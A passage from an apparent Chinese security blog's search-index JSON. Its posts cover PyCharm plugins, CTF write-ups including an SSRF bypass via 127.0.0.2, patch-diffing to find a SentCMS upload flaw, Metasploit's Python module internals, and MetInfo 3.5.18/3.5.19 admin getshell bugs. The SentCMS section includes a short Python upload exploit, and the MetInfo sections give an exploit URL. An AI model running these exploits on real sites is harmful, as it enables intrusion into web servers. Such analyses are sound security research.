真凶被抓","path":"2018/08/07/botnet/","date":"08-07","excerpt":""},{"title":"pycharm插件","text":"pycharm插件使用打开file-&gt;setting-&gt;plugins 是pycharm的插件界面了 自带的插件比较多 包括了git,ssh,javascript,css等 pycharm也提供了从官方存储库下载的功能，只需点击install jetbrain plugins. 从磁盘下载则是install plugins for disk 常用插件推荐.ignore 版本控制库忽略提交文件 如git的.gitignore 插件 markdown support markdown插件 Material Theme ui pycharm主题 非常好看 ideavim vim操作支持statistic 统计项目行数","path":"2018/06/12/pycharm/","date":"06-12","excerpt":""},{"title":"i春秋61挑战 wp","text":"在i春秋 61挑战出了道简单的签到题题目是一个损坏的pyc文件 wp首先生成一个正常pyc文件 python -m py_compile $filename 对比如下 可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 https://tool.lu/pyc/ 得到反编译代码1_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78)) 打印 _ 得到flag flag{pycyeshipy} 题目很简单 但是不知道为什么只有两位表哥做出来","path":"2018/06/04/newpost/","date":"06-04","excerpt":""},{"title":"一道简单题目","text":"题目代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask, requestimport requestsimport jsonimport socketfrom urllib.parse import urlparsefrom os.path import abspath，isfileapp = Flask(__name__)@app.route(&apos;/&apos;, methods=[&apos;POST&apos;, &apos;PUT&apos;])def main(): if request.method == &apos;POST&apos;: return &apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt; &lt;title&gt;405 Method Not Allowed&lt;/title&gt; &apos; \\ &apos;&lt;h1&gt;Method Not Allowed&lt;/h1&gt; &lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt; &lt;!-- /flag --&gt; &apos; if request.method == &apos;PUT&apos;: if not request.json: return &apos;数据格式错误&apos; data = request.data j_data = json.loads(data) try: url = j_data[&apos;url&apos;] except: return &apos;缺少url字段&apos; try: filename = j_data[&apos;filename&apos;] except: return &apos;缺少filename字段&apos; host = urlparse(url).hostname ip_address = socket.getaddrinfo(host, &apos;http&apos;)[0][4][0] if ip_address == &apos;127.0.0.1&apos;: return &apos;url不能是127.0.0.1&apos; ret = requests.get(url) filename = abspath(filename) if isfile(filename): return &apos;文件已存在&apos; with open(filename) as f: f.write(ret.text) return &apos;文件已写入&apos;@app.route(&apos;/flag&apos;)def flag(): ip = request.remote_addr if ip != &apos;127.0.0.1&apos;: return &apos;你的ip不是127.0.0.1&apos; return &apos;flag&#123;ichunqiu51&#125;&apos;if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;) wp参考思路来源自p牛的博客 https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html 技术主要考核了对ip协议的熟悉度 不止127.0.0.1 127.x这个段也是访问本机 过程直接访问/ 发现状态码405 尝试post方法访问 返回界面也是405 但是状态码是200 查看网页源代码 发现注释 /flag 访问获得提示 你的ip不是127.0.0.1 继续尝试 put方法访问/ 得到提示 数据格式错误尝试json 根据提示构造出合适的格式 该功能是获取url地址文件并写入文件. flask默认可以直接读取的文件夹是 /static/ 尝试输入127.0.0.1/flag 发现被禁止 尝试绕过127.0.0.2/flag 得到flag","path":"2018/05/31/一道简单题目/","date":"05-31","excerpt":""},{"title":"寻找历史漏洞","text":"前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms 发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址 或者使用git clone https://gitee.com/sentcms/sentcms码云作为中国的github 自然是很方便。但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理因为git的版本管理和提交对比非常实用 也方便保存进度 大致的git操作是123456789git init #初始化git仓库git add * #将旧版本全部文件添加git commit # 作为初始提交# 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/ . 或者其他操作# git status 可能你会想要查看一下文件差异git add * # 将全部文件改变添加git commit # 提交更改# git log 查看日志# git diff 查看差异 找到漏洞版本一般来说你可以在版本更新日志里找到一些信息 很多cms都是有版本更新日志的 我们可以查看到修复了什么漏洞 但是这个cms没有发行版 如果没有这种信息只能一个提交一个提交的去对比了 可以使用web查看 地址 你也可以使用1git log 我们可以找到一条看起来可能是修复漏洞的提交 比较差异可以在命令行使用git diff 来查看 也可以选择直接在web界面查看每个提交 web提交地址 如果不是git 在linux可以使用diff命令1diff -r dir1 dir2 也可以选择使用一些你喜欢的文件对比工具 最重要的一步 查看代码提交行数不多 快速查看 发现疑似漏洞点可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 地址 这个时候阅读一下readme 可以看到123456│ ├─common COMMON公共模型，不可访问│ │ ├─controller 公共基类目录│ │ ├─model 模型目录│ │ ├─validate 验证配置│ │ ├─view 公共模板目录│ │ ├─widget 扩展组件目录 很明显我们不能直接访问 需要通过调用这个时候Ide就能帮助我们快速找到调用 我们在ide搜索可以找到application/admin/controller/Upload.php 没有进行任何过滤的调用了1234567891011namespace app\\admin\\controller;use app\\common\\controller\\Admin;class Upload extends Admin &#123; public function _empty() &#123; $controller = controller(&apos;common/Upload&apos;); $action = $this-&gt;request-&gt;action(); return $controller-&gt;$action(); &#125;&#125; web地址 这个cms使用了tp5框架 需要通过路由访问我们访问1http://127.0.0.1/sentcms/admin/Upload/Upload 从报错信息可以看到已经执行到了漏洞语句位置由代码可知 直接上传文件即可 python编写exp1234567import requestsurl = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;# 我本地cookeiecookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;r = requests.post(url, files=file，cookies=cookie) 我们可以在uploads\\picture\\20180521找到一个，以微秒时间的md5编码为文件名的php文件","path":"2018/05/22/findbug/","date":"05-22","excerpt":""},{"title":"metasploit python 模块是如何运行","text":"开始metasploit的扩展实现的代码主要在metasploit-framework/lib/msf/core/modules/external目录结构如下123456789101112131415161718├── bridge.rb├── message.rb├── python│ ├── async_timeout│ │ ├── __init__.py│ └── metasploit│ ├── __init__.py│ ├── __init__.pyc│ ├── module.py│ ├── module.pyc│ ├── probe_scanner.py├── shim.rb└── templates ├── capture_server.erb ├── common_metadata.erb ├── dos.erb ├── multi_scanner.erb └── remote_exploit_cmd_stager.erb 其中python目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入metasploittemplates目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如info都是靠这些模板实现的.message.rb和bridge是与msf jsonrpc通信的一些api.shim.rb则是真正将python代码实现为模块的代码. 这里省略了不重要的细节的message.rb代码123456789101112131415161718192021222324252627282930class Msf::Modules::External::Message def self.from_module(j) if j[&apos;method&apos;] m = self.new(j[&apos;method&apos;].to_sym) m.params = j[&apos;params&apos;] m elsif j[&apos;response&apos;] m = self.new(:reply) m.params = j[&apos;response&apos;] m.id = j[&apos;id&apos;] m end end def initialize(m) self.method = m self.params = &#123;&#125; self.id = Base64.strict_encode64(SecureRandom.random_bytes(16)) end def to_json params = if self.params.respond_to? :to_nested_values self.params.to_nested_values else self.params.to_h end JSON.generate(&#123;jsonrpc: &apos;2.0&apos;, id: self.id, method: self.method, params: params&#125;) end 这个类实际上是对传递给metasploit的信息的一个封装.initialize是ruby的初始化方法 从这里可以看到它有三个属性method params id from_module方法则是用于将传递的参数转换成自身to_json方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式) 这里是省略了不重要的细节的bridge.rb代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495require &apos;msf/core/modules/external/message&apos;class Msf::Modules::External::Bridge # 通过jsonrpc运行 def run(datastore) unless self.running m = Msf::Modules::External::Message.new(:run) m.params = datastore.dup send(m) self.running = true end end # 获取当前状态和恢复run状态 def get_status if self.running || !self.messages.empty? m = receive_notification if m.nil? close_ios self.messages.close self.running = false end return m end end # 接收 def recv(filter_id=nil, timeout=600) _, out, err = self.ios message = &apos;&apos; # jsonrpc发送和接受 def send_receive(message) send(message) recv(message.id) end # 发送模块元数据 def describe resp = send_receive(Msf::Modules::External::Message.new(:describe)) close_ios resp.params end # 发送 def send(message) input, output, err, status = ::Open3.popen3(self.env, self.cmd) self.ios = [input, output, err] self.wait_thread = status case select(nil, [input], nil, 0.1) when nil raise &quot;Cannot run module #&#123;self.path&#125;&quot; when [[], [input], []] m = message.to_json write_message(input, m) else raise &quot;Error running module #&#123;self.path&#125;&quot; end end # TODO 这里原本有一大段关于网络接受的代码 # 每个编程语言扩展的具体实现class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge # 判断是否是py文件 def self.applies?(module_name) module_name.match? /\\.py$/ end # 初始化 python扩展添加了额外的路径 def initialize(module_path) super pythonpath = ENV[&apos;PYTHONPATH&apos;] || &apos;&apos; self.env = self.env.merge(&#123; &apos;PYTHONPATH&apos; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&apos;../python&apos;, __FILE__) &#125;) endendclass Msf::Modules::External::Bridge # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge? LOADERS = [ Msf::Modules::External::PyBridge, Msf::Modules::External::Bridge ] # 运行模块方法 让载入的bridge都判断是否是自己所属的 def self.open(module_path) LOADERS.each do |klass| return klass.new module_path if klass.applies? module_path end nil endend 这里是省略了不重要的细节的shim.rb代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657require &apos;msf/core/modules/external/bridge&apos;class Msf::Modules::External::Shim # 将bridge返回的数据生成一个模块 def self.generate(module_path) mod = Msf::Modules::External::Bridge.open(module_path) return &apos;&apos; unless mod.meta # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 case mod.meta[&apos;type&apos;] when &apos;remote_exploit_cmd_stager&apos; remote_exploit_cmd_stager(mod) when &apos;capture_server&apos; capture_server(mod) when &apos;dos&apos; dos(mod) when &apos;scanner.multi&apos; multi_scanner(mod) else # TODO have a nice load error show up in the logs &apos;&apos; end end # 返回一个模块 erb是ruby的一个代码模板库 def self.render_template(name, meta = &#123;&#125;) template = File.join(File.dirname(__FILE__), &apos;templates&apos;, name) ERB.new(File.read(template)).result(binding) end def self.common_metadata(meta = &#123;&#125;) render_template(&apos;common_metadata.erb&apos;, meta) end # 数据转换 def self.mod_meta_common(mod, meta = &#123;&#125;) meta[:path] = mod.path.dump meta[:name] = mod.meta[&apos;name&apos;].dump meta[:description] = mod.meta[&apos;description&apos;].dump meta[:authors] = mod.meta[&apos;authors&apos;].map(&amp;:dump).join(&quot;,\\n &quot;) meta[:options] = mod.meta[&apos;options&apos;].map do |n, o| &quot;Opt#&#123;o[&apos;type&apos;].camelize&#125;.new(#&#123;n.dump&#125;, [#&#123;o[&apos;required&apos;]&#125;, #&#123;o[&apos;description&apos;].dump&#125;, #&#123;o[&apos;default&apos;].inspect&#125;])&quot; end.join(&quot;,\\n &quot;) meta end # 渲染膜拜 def self.dos(mod) meta = mod_meta_common(mod) meta[:date] = mod.meta[&apos;date&apos;].dump meta[:references] = mod.meta[&apos;references&apos;].map do |r| &quot;[#&#123;r[&apos;type&apos;].upcase.dump&#125;, #&#123;r[&apos;ref&apos;].dump&#125;]&quot; end.join(&quot;,\\n &quot;) render_template(&apos;dos.erb&apos;, meta) endend 所以python模块的运行过程其实是这样的 class Msf::Modules::External::Shim获取到了模块路径 调用Msf::Modules::External::Bridge.open 在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块) 初始化一个Msf::Modules::External::PyBridge并返回 判断元数据类型 假设是dos 则调用dos方法 调用mod_meta_common方法转换元数据 渲染代码模板 我们可以查看dos.erb的内容1234567891011121314151617181920212223242526272829require &apos;msf/core/modules/external/bridge&apos;require &apos;msf/core/module/external&apos;class MetasploitModule &lt; Msf::Auxiliary include Msf::Module::External include Msf::Auxiliary::Dos def initialize super(&#123; &lt;%= common_metadata meta %&gt; &apos;References&apos; =&gt; [ &lt;%= meta[:references] %&gt; ], &apos;DisclosureDate&apos; =&gt; &lt;%= meta[:date] %&gt;, &#125;) register_options([ &lt;%= meta[:options] %&gt; ]) end def run print_status(&quot;Starting server...&quot;) mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;) mod.run(datastore) wait_status(mod) endend 所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在12mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)mod.run(datastore) 最后通过bridge.run调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好","path":"2018/02/05/metasploit-python-模块是如何运行/","date":"02-05","excerpt":""},{"title":"metasploit python 模块","text":"metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby 为什么将python作为官方支持语言 很多不是metasploit官方人员编程的模块都是使用python编写 现在python流行程度非常高 很多渗透人员python熟练程度比ruby高 metasploit的python模块是什么主分支的一个python模块 https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py python模块实际是通过json-rpc调用与metasploit通信 metasploit获取元数据如图(来自官方博客)12345678910111213+------------+| Metasploit || | Describe yourself +-------------------+| +-------------------&gt; | some_module.py || | | || | | || | Some metadata | || | &lt;-------------------+ || | | || | +-------------------+| || |+------------+ 模块调用如图123456789101112131415161718+------------+| Metasploit | Do a thing with| | these options +-------------------+| +-------------------&gt; | some_module.py || | | || | | || | A bit of status | || | &lt;-------------------+ || | | || | Moar status | || | &lt;-------------------+ || | | || | I found a thing | || | &lt;-------------------+ || | | || | +-------------------+| |+------------+ 将会发生什么实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块 python在metasploit能做什么可以使用的和ruby模块并没有区别 如何编写一个python模块首先需要导入需要的模块123#!/usr/bin/env python# another:bluebirdfrom metasploit import module 这个metasploit实际上路径是 lib/msf/core/modules/external/python/ 然后定义元数据 格式和ruby模块的一样.详细可参考这里的文档 123456789101112131415161718192021222324metadata = &#123; # 模块名字 &apos;name&apos;: &apos;metasploit python module demo &apos;, # 模块的描述 &apos;description&apos;: &apos;&apos;&apos; send a http request metasploit python module demo &apos;&apos;&apos;, # 模块作者 &apos;authors&apos;: [ &apos;bluebird&apos;, ], # 编写时间 &apos;date&apos;: &apos;2018-02-02&apos;, # 漏洞参考 &apos;references&apos;: [ ], # 漏洞类型 只能在已有的类型选项 &apos;type&apos;: &apos;dos&apos;, # 模块选项 &apos;options&apos;: &#123; &apos;rhost&apos;: &#123;&apos;type&apos;: &apos;address&apos;, &apos;description&apos;: &apos;The target address&apos;, &apos;required&apos;: True, &apos;default&apos;: None&#125;, &apos;rport&apos;: &#123;&apos;type&apos;: &apos;port&apos;, &apos;description&apos;: &apos;The target port&apos;, &apos;required&apos;: True, &apos;default&apos;: 80&#125;, &#125;&#125; 然后一般应该定义一个run方法.这个demo输出了helloworld12def run(args): module.log(&apos;helloworld&apos;) 最后定义主方法12if __name__ == &quot;__main__&quot;: module.run(metadata, run) 让我们实际跑一下(注意请给你的python文件添加执行权限)12345678msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1rhost =&gt; 127.0.0.1msf5 auxiliary(test/demo) &gt; run[*] Starting server...[*] hello world[*] Auxiliary module execution completedmsf5 auxiliary(test/demo) &gt;","path":"2018/02/02/metasploit-python-模块/","date":"02-02","excerpt":""},{"title":"metinfo3.5.19后台getshell分析","text":"metinfo后台getshellexp分析漏洞版本3.5.19 漏洞文件路径/admin/app/physical/physical.php有趣的是3.5.18修复的后台getshell也是这个文件3.5.18漏洞分析 点我上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享 漏洞代码1234567891011121314elseif($action==&quot;op&quot;)&#123; // 不相关代码 $val=explode(&apos;|&apos;,$valphy); // 不相关代码 switch($op)&#123; // 不相关代码 case 3: $fileaddr=explode(&apos;/&apos;,$val[1]); $filedir=&quot;../../../&quot;.$fileaddr[0]; if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; if($fileaddr[1]==&quot;index.php&quot;)&#123; if($val[2])&#123; Copyindx(&quot;../../../&quot;.$val[1],$val[2]); &#125; 需要op参数为3才能进入漏洞代码流程，并且要正常执行，需要fileaddr[1]=&#39;index.php&#39;和$val[2]也就是valphy参数要为xxx|xxx/index.php|xxx格式 查看Copyindex函数12345678910111213function Copyindx($newindx,$type)&#123; if(!file_exists($newindx))&#123; if($type==3)&#123; //生成产品栏目index $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\n\\$cmodule=&apos;product_index&apos;;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;; &#125;else&#123; $oldcont =&quot;&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\n\\$filpy = basename(dirname(__FILE__));\\n\\$fmodule=$type;\\nrequire_once &apos;../include/module.php&apos;; \\nrequire_once \\$module; \\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;&quot;; &#125; $fp = fopen($newindx,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; 可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控","path":"2017/11/28/metinfo3-5-19后台getshell分析/","date":"11-28","excerpt":""},{"title":"metinfo3.5.18后台getshell分析","text":"此漏洞已经在最新版修复 exp /admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件 代码分析查看关键代码123456789101112131415161718192021222324252627282930313233343536373839case 3: $fileaddr=explode('/',$val[1]); $filedir=\"../../../\".$fileaddr[0]; if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; if($fileaddr[1]==\"index.php\")&#123; if($val[2])&#123; Copyindx(\"../../../\".$val[1],$val[2]); &#125; &#125;else&#123; // 漏洞点 switch($val[2])&#123; case 1: $address=\"../about/$fileaddr[1]\"; break; case 2: $address=\"../news/$fileaddr[1]\"; break; case 3: $address=\"../product/$fileaddr[1]\"; break; case 4: $address=\"../download/$fileaddr[1]\"; break; case 5: $address=\"../img/$fileaddr[1]\"; break; case 8: $address=\"../feedback/$fileaddr[1]\"; break; &#125; $newfile =\"../../../$val[1]\"; Copyfile($address,$newfile); &#125; echo $lang_physicalgenok; break; 我们可以看到我们可控参数$address和newfile传入了Copyfile主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行Copyfile 查看Copyfile函数12345678function Copyfile($address,$newfile)&#123; $oldcont = \"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"; if(!file_exists($newfile))&#123; $fp = fopen($newfile,w); fputs($fp, $oldcont); fclose($fp); &#125;&#125; 此函数可以创建并写入文件可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell 查看最新版本修复方法123default: $address = \"\";break; 添加了不是正常参数时候默认为空","path":"2017/11/25/metinfoexp/","date":"11-25","excerpt":""}]}